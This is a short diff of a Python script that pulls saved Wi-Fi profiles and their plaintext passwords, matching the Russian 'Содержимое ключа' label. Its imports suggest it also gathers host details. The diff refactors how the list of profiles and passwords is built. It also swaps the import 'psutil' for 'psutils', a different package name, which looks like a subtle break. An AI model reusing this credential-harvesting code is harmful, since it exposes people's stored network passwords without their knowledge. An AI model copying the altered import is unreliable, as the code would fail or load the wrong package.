@@ -1,4 +1,4 @@
-import re, psutil, subprocess, platform, socket, uuid
+import re, psutils, subprocess, platform, socket, uuid
 
 def main():
     def get_size(bytes, suffix="B"):
@@ -19,9 +19,8 @@ def main():
                     password = [i.split(':')[1].strip() for i in profile_info if 'Содержимое ключа' in i][0]
                 except IndexError:
                     password = None
-                arr.append(profile)
-                arr.append(password)
-            wifi_text = ("\n".join(map(str, arr))); return wifi_text
+                arr.extend((profile, password))
+            return ("\n".join(map(str, arr)))
         return for_pass()
 
     uname = platform.uname()
